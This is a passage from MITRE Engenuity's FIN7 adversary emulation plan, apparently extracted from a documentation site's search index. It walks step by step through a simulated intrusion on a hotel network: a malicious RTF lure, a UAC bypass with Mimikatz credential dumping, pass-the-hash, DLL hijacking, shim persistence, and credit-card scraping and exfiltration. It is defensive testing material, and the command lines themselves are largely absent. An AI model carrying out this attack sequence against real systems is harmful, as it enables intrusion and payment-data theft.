industries. It further describes a representative FIN7 operational flow along with their publicly attributed Tactics, Techniques, and Procedures (TTPs) mapped to ATT&CK.","The Operations Flow chains techniques together into a logical order that commonly occurs across FIN7 operations. This FIN7 emulation plan features two distinct scenarios described below.","Please note that the Carbanak portion of this plan contains two additional scenarios used during the 2020 ATT&CK Evaluations and can also be found within the CTID ATTACK Evaluations Library.","Scenario 1: This scenario emulates FIN7 targeting a hotel manager network to gain access to credit card information. The scenario begins with FIN7 achieving initial access to the network after an unwitting user executes a malicious .LNK file. FIN7 then pivots to a privileged IT administrator workstation. From this system, FIN7 keylogs credentials needed to access an accounting workstation. FIN7 then pivots to the accounting workstation, establishes persistence, and deploys malware to scrape credit card information from process memory.","Scenario 2: This scenario emulates the same FIN7 TTP's as scenario 1; however, changes were made to support environments with Protective security controls enabled. This scenario is designed so that specific TTP's are decoupled from dependencies to enable all steps to be executed, even if previous steps are blocked.","The FIN7 emulation plan is a human-readable, step-by-step / command-by-command implementation of FIN7 TTPs. Structurally, the plan is organized into an infrastructure section, and two scenarios (Detections and Protections respectively). The infrastructure section explains how to prepare the environment to execute both scenarios. The human-readable plan is accompanied by a machine-readable plan implemented in YAML. The YAML includes all steps, commands, and syntax for both Scenario 1 and Scenario 2. The YAML template was nuanced to ensure that each step within the YAML is directly coupled with its equivalent human-readable version."]},{"l":"Resources","p":["Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:"]},{"l":"YARA Rules","p":["YARA rules are provided to assist the community in researching, preventing, and detecting malware specimens used in this emulation plan."]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Microsoft","Special thanks to the following projects for providing tools and source code that were used in this emulation:","Metasploit Framework","PowerSploit","sRDI","Mimikatz","PAExec"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2021 MITRE Engenuity. Approved for Public Release. Document number AT0016.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"Scenario 1"},{"l":"Preface","p":["For the purpose of this emulation plan, FIN7 operations have been separated into 2 scenarios (detections and protections), with steps and granular procedures contained within each. This division enables users to separately test detection and protection capabilities of their defenses. Within each scenario, operations have been broken into specific objectives, which are presented linearly.","While in Scenario 1 each objective enables subsequent objectives, Scenario 2 is designed such that each objective is run independently of any other. Specifically, this scenario is intended to be used in an environment that does not have protective/preventative defense measures enabled, so as to assess detection capabilities. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources. The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives.","This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run. For ease of use, a script has been included to automatically make these substitutions, found here."]},{"i":"overview---detections","l":"Overview - Detections","p":["Emulation of FIN7 usage of tools such as SQLRat, BABYMETAL, BOOSTWRITE, and PILLOWMINT","Scenario begins after delivery of a reverse shell payload distributed via spearphishing","Targeted attack of a hospitality organization with the explicit goal of credit card theft","Designed to assess detection capabilities"]},{"l":"Contents","p":["Step 0 - Start C2 Server","Step 1 - Initial Breach","Step 2 - Delayed Malware Execution","Step 3 - Target Assessment","Step 4 - Staging Interactive Toolkit","Step 5 - Escalate Privileges","Step 6 - Expand Access","Step 7 - Setup User Monitoring","Step 8 - User Monitoring","Step 9 - Setup Shim Persistence","Step 10 - Steal Payment Data"]},{"l":"Pre-requisites","p":["Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the Scenario 1 Infrastructure documentation."]},{"i":"step-0---start-c2-server","l":"Step 0 - Start C2 Server","p":["Before the scenario begins, the attacker needs to start their C2 server to catch their first beacon from the target."]},{"l":"Procedures","p":["On the Windows Attack Platform:","Open command prompt and cd to the c2fin7.exe binary","Execute the following command","On the Linux Attack Platform:","Start tmux"]},{"i":"step-1---initial-breach-evaluations-step-11","l":"Step 1 - Initial Breach (Evaluations Step 11)","p":["The scenario begins with an initial breach where a legitimate user ( T1204) opens an RTF document and double clicks text that says \"Double Click Here to Unlock Contents\". The RTF file contains an embedded Visual Basic payload ( T1027). After double clicking the text block, mshta.exe executes ( T1170) the Visual Basic payload( T1059). mshta.exe then assembles embedded text within the RTF file into a JavaScript payload. Next, mshta.exe makes a copy of the legitimate wscript.exe on disk as Adb156.exe( T1036). winword.exe spawns verclsid.exe( T1175). mshta.exe loads taskschd.dll and creates a scheduled task to execute in 5 minutes ( T1053)."]},{"i":"procedures-1","l":"Procedures"},{"i":"1a---user-execution-malicious-file-with-licensed-microsoft-word-t1204002","l":"1.A - User Execution: Malicious File (with licensed Microsoft Word) (T1204.002)","p":["If testing with Microsoft Word, perform the following. If not, perform Step 1.A* instead.","On the Linux Attack Platform:","Copy 2-list.rtf to domain_admin's Desktop on hotelmanager.","Provide domain_admin's password when prompted:","domain_admin_password","On hotelmanager:","Login to victim workstation as domain_admin","Double-click 2-list.rtf located on domain_admin's desktop","Decline any spurious prompts, including updating document with linked data","Double click the text that says \"Double Click Here To Unlock Contents\"","When prompted to run an lnk file, click \"open\"","Set a timer for 6 minutes - the scheduled task will fire 5 minutes after opening the lnk file on the minute so take 6 to be safe"]},{"i":"1a---user-execution-malicious-file-without-a-microsoft-word-license","l":"1.A* - User Execution: Malicious File (without a Microsoft Word license)","p":["Perform the following if you're testing without Office licenses:","On the Linux Attack Platform:","Upload 2-list.rtf, unprotectedNoWord.lnk, and obfuscated-payload.vbs to hotelmanager as 2-list.rtf, 2-list.lnk, and payload.vbs respectively","Provide domain_admin's password when prompted:","domain_admin_password","On hotelmanager:","Login to victim workstation as domain_admin","Double-click 2-list.rtf located on domain_admin's desktop","Decline any spurious prompts, including updating document with linked data","Double click 2-list.lnk on domain_admin's Desktop","Set a timer for 6 minutes - the scheduled task will fire 5 minutes after opening the lnk file on the minute so take 6 to be safe"]},{"l":"Cited Intelligence","p":["FIN7 has created malicious DOCX and RTF lures that convince users to double-click on an image in the document. When a user double-clicks an image, an embedded malicious LNK file is spawned that launches mshta.exe, which executes a VBScript one-liner to decode a script hidden in the document. 4","FIN7 has copied wscript.exe into %LOCALAPPDATA% and renamed it. 3, 25"]},{"i":"step-2---delayed-malware-execution-evaluations-step-12","l":"Step 2 - Delayed Malware Execution (Evaluations Step 12)","p":["The previously created scheduled task spawns Adb156.exe via svchost( T1053.005). Adb156.exe then loads scrobj.dll and executes sql-rat.js via jscript ( T1059.7). Next, Adb156.exe then connects to 192.168.0.6 via MSSQL transactions ( T1071) (TCP port 1433). Finally, FIN7 performs WMI queries to obtain network configuration information ( T1016) and system information ( T1082)."]},{"i":"procedures-2","l":"Procedures"},{"i":"2a---sqlrat-execution-via-scheduled-task-t1053005","l":"2.A - SQLRat Execution via Scheduled Task (T1053.005)","p":["On the Windows Attack Platform:","To verify that you have a new session on hotelmanager from your C2 server, run the following command to get the MAC of hotelmanager"]},{"i":"2b---upload-powershell-stager","l":"2.B - Upload Powershell Stager","p":["Upload the PowerShell stager via SQLRat."]},{"i":"cited-intelligence-1","l":"Cited Intelligence","p":["FIN7 has created scheduled tasks to establish persistence. 23, 4","SQLRat has dropped files and executed SQL scripts on a host system. 5","FIN7 has deployed a custom \"profiling\" script to fingerprint the machine and network environment. 3","SQLRat has downloaded a powershell script through MSSQL transactions. 5"]},{"i":"step-3---target-assessment-evaluations-step-13","l":"Step 3 - Target Assessment (Evaluations Step 13)","p":["Adb156.exe makes WMI queries for process discovery ( T1057). Next, Adb156.exe spawns cmd.exe to execute net view( T1135). As a defensive evasion tactic, FIN7 leverages Adb156.exe to query for virtualization/sandbox information ( T1497). FIN7 then leverages Adb156.exe to query the USERNAME environment variable ( T1033) and the COMPUTERNAME( T1082) environment variable.","Adb156.exe accesses the Windows Script Host ADSystemInfo Object COM object by loading adsldp.dll then calling the DllGetClassObject() API ( T1082). Next, Adb156.exe makes another WMI query for System Network Configuration discovery ( T1016) and System Information Discovery ( T1082).","Finally, Adb156.exe downloads takeScreenshot.ps1 from 192.168.0.6 via MSSQL transactions. FIN7 then spawns cmd.exe ( T1059) and then launches powershell.exe ( T1086). FIN7 leverages powershell to execute a script that performs a screen capture ( T1113) of the local desktop. Then, the screenshot is uploaded to 192.168.0.6 via MSSQL transactions ( T1041)."]},{"i":"procedures-3","l":"Procedures"},{"i":"3a---local-discovery-t1057-t1135-t1497-t1033-t1082-t1016","l":"3.A - Local Discovery (T1057, T1135, T1497, T1033, T1082, T1016)","p":["On the Windows Attack Platform:","Perform initial system triage"]},{"i":"3b---screen-capture-t1105-t1059003-t1059001-t1113-t1041","l":"3.B - Screen Capture (T1105, T1059.003, T1059.001, T1113, T1041)","p":["Upload screenshot utility to take screenshot of user's desktop","Execute the takescreenshot.ps1 PowerShell script","Download the screenshot"]},{"i":"cited-intelligence-2","l":"Cited Intelligence","p":["HALFBAKED has been utilized to listen for commands from the C2 server to carry out tasks such as sending victim machine information and listing processes running. 25","FIN7 has deployed capabilities that allow the operators to take a screenshot of the remote system. 25, 4"]},{"i":"step-4---staging-interactive-toolkit-evaluations-step-14","l":"Step 4 - Staging Interactive Toolkit (Evaluations Step 14)","p":["The stager uploaded in stage-1 is now executed which results in a Meterpreter shell (BABYMETAL) which is used for this step. Adb156.exe spawns cmd.exe( T1059) which then spawns powershell.exe( T1086). powershell.exe then decodes an embedded DLL payload ( T1140) which is executed via the PowerShell cmdlet Invoke-Expression( T1086). Finally, powershell.exe loads shellcode into memory( T1140) from a data received via a network connection made to port 443 on the C2 server ( T1071, T1032)."]},{"i":"procedures-4","l":"Procedures"},{"i":"4a---staging-interactive-toolset-t1086","l":"4.A - Staging Interactive Toolset (T1086)","p":["On the Linux Attack Platform:","Start Metasploit","Start a Meterpreter handler on port 443","On the Windows Attack Platform:","Execute the stager.ps1 script and wait for the Meterpreter callback","You should receive a new Meterpreter session on the Linux Attack Platform."]},{"i":"cited-intelligence-3","l":"Cited Intelligence","p":["FIN7 has executed a PowerShell script to decode and inject shellcode via an embedded DLL into memory. 23, 4, 18"]},{"i":"step-5---escalate-privileges-evaluations-step-15","l":"Step 5 - Escalate Privileges (Evaluations Step 15)","p":["FIN7 leverages powershell.exe to execute the CreateToolHelp32Snapshot()( T1057) Win32 API for process discovery. Next, samcat.exe(a modified version of mimikatz) and uac-samcats.ps1 are downloaded from the C2 server via powershell.exe ( T1507). FIN7 then executes the uac-samcats.ps1. This in turn spawns powershell.exe from powershell.exe( T1086) followed by executing samcat.exe as a high integrity process ( T1088). The samcat.exe executable reads local credentials from SAM ( T1003.001). Then powershell.exe executes the GetIpNetTable()( T1016) API to identify ARP entires. powershell.exe then spawns nslookup.exe to query hoteldc(<hoteldc_ip>) for an IP identified from the ARP entry ( T1018).","Note, SamCats is a modified version of mimikatz that just runs Mimikatz SAM dumping components"]},{"i":"procedures-5","l":"Procedures"},{"i":"5a---enumerate-processes-execute-samcats-and-discover-itadmin-t1059001-t1140-t1071001-t1573002","l":"5.A - Enumerate-Processes, Execute SamCats, and Discover ITAdmin (T1059.001, T1140, T1071.001, T1573.002)","p":["On the Linux Attack Platform:","Interact with the recently obtained Meterpreter session","List processes","Upload samcat.exe(modified Mimikatz) and uac-samcats.ps1(UAC Bypass script) to hotelmanager","Execute the UAC bypass script","Wait for the script to return. You should see credentials dumped to the screen.","Discover ARP entries","Perform nslookup against itadmin"]},{"i":"cited-intelligence-4","l":"Cited Intelligence","p":["FIN7 has used memory scrapers such as mimikatz to dump the passwords of logged on users. 9, 6","The Carbank malware has contained a UAC bypass. 10","FIN7 has used tools such as PowerSploit to pivot to additional hosts. 6"]},{"i":"step-6---expand-access-evaluations-step-16","l":"Step 6 - Expand Access (Evaluations Step 16)","p":["Step 6A begins by downloading paexec.exe and hollow.exe via powershell.exe ( T1105) to AppData\\Local\\ of the current Meterpreter session user. Next, FIN7 interactes with with the target through Meterpreter spawning powershell.exe from cmd.exe ( T1059.003). The password hash obtained from samcats.exe is leveraged by paexec( T1021.002) to copy hollow.exe onto the IT Admin host as user kmitnick The executable paexec.exe starts a temporary Windows service( T1035) during the copying process called PAExec-{PID}-{HOSTNAME}.exe which executes the hollow.exe ( T1021.002). The executable hollow.exe spawns svchost.exe and unmaps its memory image ( T1055.012). Then, svchost exchanges data with 192.168.0.4 over HTTPS protocols ( T1071.001, T1573.002)."]},{"i":"procedures-6","l":"Procedures"},{"i":"6a---expand-access-t1105-t1059003-t1078002-t1021002-t1569002-t1055012","l":"6.A - Expand Access (T1105, T1059.003, T1078.002, T1021.002, T1569.002, T1055.012)","p":["On the Linux Attack Platform:","Upload the lateral movement utility, paexec.exe","Upload the hollow.exe(process hollowing) executable","Drop into an interactive session on the target host","Change directory to C:\\Users\\domain_admin.domain\\AppData\\Local","Use paexec.exe to perform pass-the-hash to execute hollow.exe on itadmin","Wait to receive a new Meterpreter session and for paexec to return.","paexec never finishes execution, press enter a few times and wait for the prompt to return.","Exit the CMD prompt from within the Meterpreter session","Background the current Meterpreter session"]},{"i":"cited-intelligence-5","l":"Cited Intelligence","p":["FIN7 has used PAExec to execute remote commands and move laterally within an environment. 9, 6","FIN7 has performed process injection to execute malicious payloads from memory. 19, 13"]},{"i":"step-7---setup-user-monitoring-evaluations-step-17","l":"Step 7 - Setup User Monitoring (Evaluations Step 17)","p":["Step 7 focuses on emulating the DLL Hijacking and module execution functionality of BOOSTWRITE. This step starts by creating a BOOSTWRITE Meterpreter handler as well as staging a temporary Python HTTP server hosting an index.html page with the ASCII character \"B\". Next, svchost.exe(Meterpreter session obtained via hollow.exe execution) downloads BOOSTWRITE.dll to C:\\Windows\\SysWOW64\\srrstr.dll( T1105). The \"srrstr.dll\" DLL is masquerading) to match the legitimate name of srrstrl.dll which is found in C:\\Windows\\System32. Next, cmd.exe spawns from svchost.exe( T1059.003)) which executes SystemPropertiesAdvanced.exe that in turn loads and executes the malicious srrstr.dll( T1574)). After srrstr.dll has been loaded and executed, rundll32.exe is spawned as a child process to communicate with the C2 server over HTTPs protocol on port 8080 ( T1071), T1573)) granting a new shell to the adversary."]},{"i":"procedures-7","l":"Procedures"},{"i":"7a---boostwrite-t1105-t1036005-t1059003-t1574001-t1071001-t1573002","l":"7.A - Boostwrite (T1105, T1036.005, T1059.003, T1574.001, T1071.001, T1573.002)","p":["On the Linux Attack Platform:","Open a new tmux window","Setup a Python SimpleHTTPServer to host the XOR key","Switch back to the Metasploit terminal","Setup a Meterpreter handler on 8080 for the BOOSTWRITE shell","Switch to the newly received Meterpreter shell created by hollow.exe","Upload BOOSTWRITE.dll to C:\\Windows\\Syswow64\\","Launch SystemPropertiesAdvanced.exe to execute the DLL hijack","You should receive a new Meterpreter session.","Switch back to the Python HTTP Server tmux window","Stop the Python HTTP Server, we no longer need it","Exit the HTTP Server tmux window"]},{"i":"cited-intelligence-6","l":"Cited Intelligence","p":["BOOSTWRITE is a loader that has been launched via abuse of the DLL search order of applications which load legitimate services. This has included matching names of legitimate DLLs to force applications to import BOOSTWRITE DLLs instead of the legitimate DLLs. 2"]},{"i":"step-8---user-monitoring-evaluations-step-18","l":"Step 8 - User Monitoring (Evaluations Step 18)","p":["Step 8 focuses on emulating user monitoring activity. Adversary emulation begins by migrating into explorer.exe from svchost.exe( T1055). Next, the metasploit screenspy module is leveraged for screen capture ( T1113). Upon completing screencapture, the Meterpreter session is then migrated into mstsc.exe ( T1056.001) and a keylogger is deployed via Meterpreter ( T1056.001)."]},{"i":"procedures-8","l":"Procedures"},{"i":"8a---user-monitoring-t1055-t1113-t1055-t1056001","l":"8.A - User Monitoring (T1055, T1113, T1055, T1056.001)","p":["On itadmin, begin roleplaying as the legitimate domain_admin user:","Log in to itadmin as domain_admin","Open the Remote Desktop Connection client","On the Linux Attack Platform:","Background the current Meterpreter session","Perform 180 screen captures using Metasploit's screen_spy module through the hollow.exe Meterpreter session.","Wait for the screen_spy module to complete, then confirm that the screenshots were recorded.","Interact with the hollow.exe Meterpreter session","Migrate into mstsc.exe(RDP client)","Start keylogging within mstsc.exe","Switch back to itadmin and continue roleplaying as the legitimate domain_admin user:","Enter an RDP session using the mstsc.exe RDP client","Back on the Linux Attack Platform:","Dump the logged keys","Stop the keylogging process"]},{"i":"cited-intelligence-7","l":"Cited Intelligence","p":["The Carbanak malware is capable of recording video of a victim's desktop and performining keylogging. 7, 21"]},{"i":"step-9---setup-shim-persistence-evaluations-step-19","l":"Step 9 - Setup Shim Persistence (Evaluations Step 19)","p":["Step 9 focuses on emulating persistence techniques. Adversary emulation begins with a valid logon to the accounting workstation as user kmitnick ( T078). After establishing a RDP session from itadmin to accounting over TCP port 3389 ( T1021, T1090). powershell.exe is spawned from powershell.exe( T1059).","The powershell.exe executable then executes base64 encoded commands ( T1027) to download dll329.dll and sdbE376 from the C2 server ( T1105). The executable sdbinst.exe is then used to install sdbE376.tmp for application shimming ( T1546.011)."]},{"i":"procedures-9","l":"Procedures"},{"i":"9a---pivot-to-accounting-t1078003-t1021-t1090-t1059001-t1027","l":"9.A - Pivot to Accounting (T1078.003, T1021, T1090, T1059.001, T1027)","p":["On the Linux Attack Platform:","Background the current Meterpreter session","Create a reverse_https Meterpreter listener on port 53","Interact with your Boostwrite shell on itadmin","Create a portfwd to tunnel port 3389 from the Linux Attack Platform to the Accounting workstation","Background this Meterpreter session","On your Ubuntu machine:","RDP to accounting through the TCP tunnel from the Linux Attack Platform, mounting a local folder as a drive"]},{"i":"9b---setup-shim-persistence-t1105-t1546011","l":"9.B - Setup Shim Persistence (T1105, T1546.011)","p":["On accounting:","Open an administrative PowerShell session","Paste and run the following encoded PowerShell command to prep and install the application shim","Note: this PowerShell command places the files needed for the shim persistence into the C:\\Windows\\Temp directory, adds a registry key for the DLL to be installed as a shim to HKLM:\\Software\\Microsoft\\DRM\\, and lastly runs sdbinst.exe to perform the installation."]},{"i":"cited-intelligence-8","l":"Cited Intelligence","p":["The Carbanak malware is capable of performing network tunneling. 21","FIN7 has utilized terminal services such as Remote Desktop Protocol (RDP) to move laterally within environments. 9","FIN7 has leveraged an application shim database registered using the sdbinst.exe utility to achieve persistence on systems in multiple environments. To install and register the malicious shim database, FIN7 has used custom Base64 encoded PowerShell scripts. 24"]},{"i":"step-10---steal-payment-data-evaluations-step-20","l":"Step 10 - Steal Payment Data (Evaluations Step 20)","p":["Step 10 focuses on stealing payment data from AccountingIQ.exe. AccountingIQ.exe is a fake payment application meant to mimic credit card data processing. The emulation procedure begins with the machine being rebooted, which in turn queries HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB which loads the previously placed dll329.dll( T1546.011).","AccountingIQ.exe then injects into SyncHost.exe ( T1071. The executable rundll32.exe then communicates back to the C2 host via HTTPS over port 53 ( T1071.001, T1573). The executable debug.exe is then downloaded from the C2 server ( T1105) and performs process discovery tasks ( T1057).","rundll32.exe then downloads 7za.exe from the C2 server and zips up the previously dumped payment data."]},{"i":"procedures-10","l":"Procedures"},{"i":"10a---execute-shim-persistence-t1138","l":"10.A - Execute Shim Persistence (T1138)","p":["On accounting:","Reboot the host from the administrative PowerShell session","On your Ubuntu machine:","RDP back into accounting via the previously created TCP port 3389 tunnel","You should receive a new Meterpreter session on the Linux Attack Platform."]},{"i":"10b---obtain-credit-card-data-t1055-t1071001-t1573","l":"10.B - Obtain Credit Card Data (T1055, T1071.001, T1573)","p":["On the Linux Attack Platform:","Interact with the new Meterpreter session obtained on accounting","Upload the PillowMint credit card scraper as debug.exe","Switch to the C:\\Users\\Public directory","Execute PillowMint","Upload file archiving utility 7za.exe","Execute archiving utility to archive credit card data","Exfiltrate the previously dumped credit card data","FIN7 operations end here.","Background the current Meterpreter session","Kill all Meterpreter sessions","Kill all Metasploit handlers","Exit Metasploit"]},{"i":"cited-intelligence-9","l":"Cited Intelligence","p":["FIN7 has utilized application shimming to execute a payload stored within the registry. 24","Pillowmint has been used to scrape payment card data from memory. 9","FIN7 has targeted specific processes related to POS systems, read memory from the processes, and written them to disk for later collection. 19"]}],[{"l":"Scenario 1 Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by FIN7. Scenarios 1 and 2 share the same infrastructure; however, Scenario 1 was built to exercise detective-only security controls, and thus protective security controls are to be disabled to complete the evaluation. Scenario 2 was built to exercise protective security controls, which may be enabled while completing the evaluation.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating FIN7 to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server."]},{"l":"Resources","p":["Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:","Note, there is no change of infrastructure between Scenario 1 and Scenario 2."]},{"l":"Emulation Team Infrastructure","p":["Attacker Desktop: tested and executed on Ubuntu 20.04 LTS","Remote Desktop Client","xfreerdp","Linux Attack Platform: tested and executed on Kali Linux 2019.1","C2 Framework","Metasploit Framework","PAExec","Mimikatz","tmux","Windows Attack Platform: Windows 10 SQL Server 2019 Build 17763","ATT&CK RAT","Optional - Windows 10: Windows 10 Client build 18363","Note, this Windows 10 machine was used ONLY in the event debugging needed to occur during an evaluation."]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Linux Attack Platform","192.168.0.4","Windows Attack Platform","192.168.0.6"]},{"l":"A note about red team payloads","p":["This evaluation utilizes a combination of modified open-source and custom utilities that are representative of FIN7 malware.","These utilities include credential dumpers, and variants of process injection techniques.","Some pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP address 192.168.0.4.","Binaries that are not pre-compiled have compilation instructions included, e.g. for AccountingIQ.exe","If you would like to build the payloads yourself, please make the necessary adjustments to the payload source to match your environment."]},{"l":"Linux Attack Platform Setup","p":["Download the FIN7 ATTACK Evaluations Library to the home directory"]},{"l":"Windows Attack Platform Setup","p":["Disable firewall in CMD","Setup the MSSQL Database using dbsetup.bat"]},{"l":"Target Infrastructure","p":["4 targets, all domain joined:","Domain Controller: tested and executed on Windows Server 2k19 - Build 17763.","Accounting Manager Workstation: tested and executed on Windows 10 - Build 18363.","Hotel Manager: tested and executed on Windows 10 - Build 18363.","IT Admin: tested and executed on Windows 10 - Build 18363."]},{"l":"Target Infrastructure Configuration","p":["Target System","Hostname","Domain Controller","hoteldc","Hotel Manager Workstation","hotelmanager","IT Admin Workstation","itadmin","Accounting Workstation","accounting"]},{"l":"Domain Controller Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this."]},{"l":"Hotel Manager Workstation Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this.","Disable OLE Security to enable execution of initial access payload","The set-OLEsecurity.ps1 PowerShell script in the setup folder can be used to perform this.","Add a static ARP entry for itadmin:","In a CMP prompt, grab the name of the interface that connects hotelmanager to the domain","Use this interface name to set a static ARP entry"]},{"l":"IT Admin Workstation Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this.","Set ACLs to allow full control for everyone on the C:\\Windows\\SysWOW64 directory","The set-acl-syswow64.ps1 PowerShell script in the setup folder can be used to perform this."]},{"l":"Accounting Workstation Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this.","Compile AccountingIQ.exe using the instructions found here","Place AccountingIQ.exe in C:\\Users\\Public","Add AccountingIQ.exe to the Registry Run key"]}],[{"l":"Scenario 2"},{"l":"Preface","p":["For the purpose of this emulation plan, FIN7 operations have been separated into 2 scenarios (detections and protections), with steps and granular procedures contained within each. This division enables users to separately test detection and protection capabilities of their defenses. Within each scenario, operations have been broken into specific objectives, which are presented linearly.","While in Scenario 1 each objective enables subsequent objectives, Scenario 2 is designed such that each objective is run independently of any other. Specifically, this scenario is intended to be used in an environment that has protective/preventative defense measures enabled. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources.","This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run. For ease of use, a script has been included to automatically make these substitutions, found here."]},{"i":"overview---protections","l":"Overview - Protections","p":["Emulation of FIN7 usage of tools such as SQLRat, BABYMETAL, BOOSTWRITE, and PILLOWMINT","Scenario begins after delivery of a reverse shell payload distributed via spearphishing","Targeted attack of a hospitality organization with the explicit goal of credit card theft","Split into distinct steps that can be run independently of other steps","Designed to assess protective/preventative defense measures"]},{"l":"Contents","p":["Step 1 - Initial Access with Embedded VBS in Word Document","Step 2 - UAC Bypass and Credential Dumping","Step 3 - Lateral Movement via Pass-the-Hash","Step 4 - DLL Hijacking","Step 5 - Shim Persistence"]},{"i":"test-1---initial-access-with-embedded-vbs-in-word-document-evaluations-test-11","l":"Test 1 - Initial Access with Embedded VBS in Word Document (Evaluations Test 11)","p":["The scenario begins with an initial breach where a legitimate user ( T1204) opens an RTF document and double clicks text that says \"Double Click Here to Unlock Contents\". The RTF file contains an embedded Visual Basic payload ( T1027). After double clicking the text block, mshta.exe executes ( T1170) the Visual Basic payload( T1059). mshta.exe then assembles embedded text within the RTF file into a JavaScript payload. Next, mshta.exe makes a copy of the legitimate wscript.exe on disk as Adb156.exe( T1036). winword.exe spawns verclsid.exe( T1175). mshta.exe loads taskschd.dll and creates a scheduled task to execute in 5 minutes ( T1053). The previously created scheduled task spawns Adb156.exe via svchost ( T1053.005). Adb156.exe then loads scrobj.dll and executes sql-rat.js via jscript( T1059.7). Next, Adb156.exe connects to 192.168.0.6 via MSSQL transactions ( T1071) (TCP port 1433). Finally, FIN7 performs WMI queries to obtain network configuration information ( T1016) and system information ( T1082).","This step consists of behaviors found in Step 1 of Scenario 1."]},{"l":"Procedures"},{"i":"1a---start-c2-server","l":"1.A - Start C2 Server","p":["On the Windows Attack Platform:","Open a CMD prompt","cd to the c2fin7.exe binary","Execute the following command"]},{"i":"1b---user-execution-malicious-file-using-microsoft-word-t1204002","l":"1.B - User Execution: Malicious File (using Microsoft Word) (T1204.002)","p":["If testing with Microsoft Word, perform the following. If not, perform Step 1.B* instead.","On the Linux Attack Platform:","Copy 2-list.rtf to domain_admin's Desktop on hotelmanager.","Provide domain_admin's password when prompted:","domain_admin_password","On hotelmanager:","Login to victim workstation as domain_admin","Double-click 2-list.rtf located on domain_admin's desktop","Decline any spurious prompts, including updating document with linked data","Double click the text that says \"Double Click Here To Unlock Contents\"","When prompted to run an lnk file, click \"open\"","Set a timer for 6 minutes - the scheduled task will fire 5 minutes after opening the lnk file on the minute so take 6 to be safe"]},{"i":"1b---user-execution-malicious-file-without-using-microsoft-word","l":"1.B* - User Execution: Malicious File (without using Microsoft Word)","p":["Perform the following if you're testing without Office licenses:","On the Linux Attack Platform:","Upload 2-list.rtf, unprotectedNoWord.lnk, and obfuscated-payload.vbs to hotelmanager as 2-list.rtf, 2-list.lnk, and payload.vbs respectively","Provide domain_admin's password when prompted:","domain_admin_password","On hotelmanager:","Login to victim workstation as domain_admin","Double-click 2-list.rtf located on domain_admin's desktop","Decline any spurious prompts, including updating document with linked data","Double click 2-list.lnk on domain_admin's Desktop","Set a timer for 6 minutes - the scheduled task will fire 5 minutes after opening the lnk file on the minute so take 6 to be safe"]},{"i":"1c---sqlrat-execution-via-scheduled-task-t1053005","l":"1.C - SQLRat Execution via Scheduled Task (T1053.005)","p":["On the Windows Attack Platform:","To verify that you have a new session on hotelmanager from your C2 server, run the following command to get the MAC of hotelmanager","Delete scheduled the previously created scheduled task via SQLRat to prevent re-firing","Kill the existing session","The C2 server should repeatedly say \"Waiting for response...\" This indicates that the session was successfully terminated.","Close the C2 server","Close the RDP session to hotelmanager."]},{"l":"Cited Intelligence","p":["FIN7 has created malicious DOCX and RTF lures that convince users to double-click on an image in the document. When a user double-clicks an image, an embedded malicious LNK file is spawned that launches mshta.exe, which executes a VBScript one-liner to decode a script hidden in the document. 4","FIN7 has copied wscript.exe into %LOCALAPPDATA% and renamed it. 3, 25","FIN7 has created scheduled tasks to establish persistence. 23, 4"]},{"i":"test-2---uac-bypass-and-credential-dumping-evaluations-test-12","l":"Test 2 - UAC Bypass and Credential Dumping (Evaluations Test 12)","p":["In this step, FIN7 uploads 2 files to hotelmanager( T1105). These are samcat.exe, a modified version of Mimikatz, and uac-samcats.ps1, a PowerShell T1059.001 wrapper script that performs a UAC bypass T1548.002 before executing samcat.exe. After uploading these files, FIN7 logs into hotelmanager T1078.002 and executes uac-samcats.ps1 to dump credentials T1003.001 from an elevated user context.","This step consists of behaviors found in Step 5 of Scenario 1."]},{"i":"2a---uac-bypass-and-credential-dumping-t1105-t1086","l":"2A - UAC Bypass and Credential Dumping (T1105, T1086)","p":["On the Linux Attack Platform:","Upload samcat.exe(modified Mimikatz) and uac-samcats.ps1(UAC Bypass script) to hotelmanager","Provide domain_admin's password when prompted:","domain_admin_password","On hotelmanager:","RDP in as domain_admin","Open a PowerShell window","Execute the uac-samcats.ps1 PowerShell script","Wait for the script to return. You should see credentials dumped to the screen.","After uac-samcats.ps1 completes, close the RDP session on Hotel Manager"]},{"i":"cited-intelligence-1","l":"Cited 